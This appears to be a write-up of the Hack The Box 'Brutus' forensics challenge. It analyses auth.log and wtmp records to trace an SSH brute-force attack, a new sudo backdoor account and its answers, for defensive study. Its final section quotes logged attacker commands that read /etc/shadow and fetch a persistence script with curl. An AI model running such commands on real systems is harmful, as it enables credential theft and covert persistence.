---
layout: single
title: "Step-by-step walkthrough of the Brutus Sherlock from HTB"
date: 2025-09-25
author_profile: true
comments: true
share: true
categories: HTB-sherlocks
tags: []
header:
  overlay_image: /assets/images/brutus/cover.png
  overlay_filter: 0.3  # optional, darkens the image for readability
  caption: "Brutus Sherlock Walkthrough"
excerpt: "Step-by-step walkthrough of the Brutus Sherlock from HTB."
feature_row:
  - image_path: /assets/images/brutus/cover.png
    alt: "Brutus Sherlock Cover"
    title: "Brutus Sherlock Walkthrough"
    excerpt: "A practical guide to solving the Brutus sherlocks."
    url: "#"
    btn_label: "Read More"
    btn_class: "btn--primary"
toc: true
toc_sticky: true
---
# Brutus

After unzipping the provided evidence, two key artifacts were available for analysis:

- **`auth.log`** → Linux authentication log
- **`wtmp`** → Binary login record file

Additionally, custom tools were provided to parse the `wtmp` file, as the default utilities may cause issues depending on system architecture.

![](/assets/images/brutus/image.png)

To ensure time consistency, the `TZ=UTC` environment variable was set before analyzing the logs. This prevents timezone mismatches that could lead to incorrect timestamps during the investigation. By utilizing Python tools, I obtained nicely formatted JSON-converted data.

![](/assets/images/brutus/image1.png)

![](/assets/images/brutus/image2.png)

Let's examine the auth.log file. It contains log timestamps, source IP addresses, service names with PIDs, messages, and a variety of other information.

```sql
kali:~$ head -50 auth.log                                                                                                   
Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)                                 
Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)                                 
Mar  6 06:18:01 ip-172-31-35-28 CRON[1117]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)                                 
Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam_unix(cron:session): session closed for user confluence                                                     
Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session closed for user confluence                                                     
Mar  6 06:18:01 ip-172-31-35-28 CRON[1117]: pam_unix(cron:session): session closed for user confluence                                                     
Mar  6 06:19:01 ip-172-31-35-28 CRON[1366]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)                                 
Mar  6 06:19:01 ip-172-31-35-28 CRON[1367]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)                                 
Mar  6 06:19:01 ip-172-31-35-28 CRON[1366]: pam_unix(cron:session): session closed for user confluence                                                     
Mar  6 06:19:01 ip-172-31-35-28 CRON[1367]: pam_unix(cron:session): session closed for user confluence                                                     
Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd1
8zIpyTqJmRq/QIZaLNrg8A failed, status 22                                                                                                                   
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:19:54 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
```

Before we delve into a detailed analysis, let's first identify the programs being executed to gain an overview of what we're working with. This can be considered a form of reconnaissance. We can easily extract the list of executed programs using the following command.

```sql
awk '{print $5}' auth.log| sed 's/[\[\:].*//g'|sort|uniq -c|sort -n

1 chfn ==> change real user name and information
1 passwd ==> change user password
1 useradd ==> create a new user or update default new user information
2 systemd ==> systemd system and service manager
2 usermod ==> modify a user account
3 groupadd ==> create a new group
6 sudo ==> execute a command as another user
8 systemd-logind ==> Login manager
104 CRON ==> daemon to execute scheduled commands (Vixie Cron)
257 sshd ==> OpenSSH remote login client
```

User creation, user information changes, password changes, sudo commands, login manager entries, and 257 `sshd` records in this `auth.log` file all indicate something suspicious. Let’s take a closer look at the logs related to `sshd`. Some of the entries do not seem useful to me.

![](/assets/images/brutus/image 3.png)

Lets remove all the lines contains `pam_unix` for more clear view.  We can do it by utilizing the `-v` flag with the grep command. Multiple failed login attempt from same ip address and same time indicates brute-force attack. 

![](/assets/images/brutus/image4.png)

Lets proceed the analysis now based on the questions.

## `Question` Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

`Solution` Lets grab all the Ip address in this file and how many time a IP appeared in this file.

```sql
kali:~$ grep sshd auth.log | grep -v pam_unix | grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'| sort | uniq -c
      1 172.31.35.28
      1 203.101.190.9
    170 65.2.161.68
```

The IP addresses 172.31.35.28 and 203.101.190.9 each appear only once in this file, whereas 65.2.161.68 appears 170 times, which is a clear indication of a brute-force attack.

`Ans` 65.2.161.68

## `Question` The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

`Solution` Since the brute-force attack was successful, there should be an 'Accepted' message. The attacker’s IP was 65.2.161.68. Let’s filter the SSH logs based on this condition.

```sql
kali:~$ grep sshd auth.log | grep -v pam_unix | grep "Accepted" | grep 65.2.161.68
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```

Based on the timestamp, the account appears to be `root`. `cyberjunkie` logged in about six minutes later.

`Ans` root

## `Question` Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

`Solution`: We already know the attacker IP address & the compromised user account was root.

```sql
kali:~$ cat wtmp.out| grep 65.2.161.68 | grep root
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 06:32:45"   "387923"        "65.2.161.68"
```

`Ans` 2024-03-06 06:32:45

## `Question` SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

`Solution`: Login data should be handled by `systemd-logind`. Let’s filter the logs based on this program.

```sql
kali:~$ grep systemd-logind auth.log     
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
```

`Ans` 37

## `Question`The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

`Solution` We can filter logs based on new user creation and higher privileges, and only one user account has come up.

```sql
kali:~$ grep -E "useradd|usermod" auth.log 
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

`Ans` cyberjunkie

## `Question` What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

`Solution` Review the Persistence → Create Account technique on the MITRE ATT&CK site. The attacker created a local useron the host and granted it high privileges, so the correct classification is Local Account (T1136.001).

![](/assets/images/brutus/image5.png)

`Ans` T1136.001

## `Question` What time did the attacker's first SSH session end according to auth.log?

`Solution` Session **34** started and ended at the same second (**06:31:40**), which indicates the attacker’s initial successful brute-force login attempt terminated immediately. In contrast, Session **37** lasted **4 minutes 40 seconds** (06:32:44 → 06:37:24), which is consistent with a manual/interactive login.

```sql
kali:~$ grep systemd-logind auth.log
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
```

`Ans` 2024-03-06 06:37:24

## `Question` The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

`Solution` Auth.log normally does *not* record every command a user runs. However, when a command is executed with `sudo`, it is recorded in `auth.log` because `sudo` performs an authentication step and the system logs that privileged action (including the invoking user, TTY, working directory, target user, and the full command).

```sql
kali:~$ grep sudo auth.log                
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
```

`Ans` /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh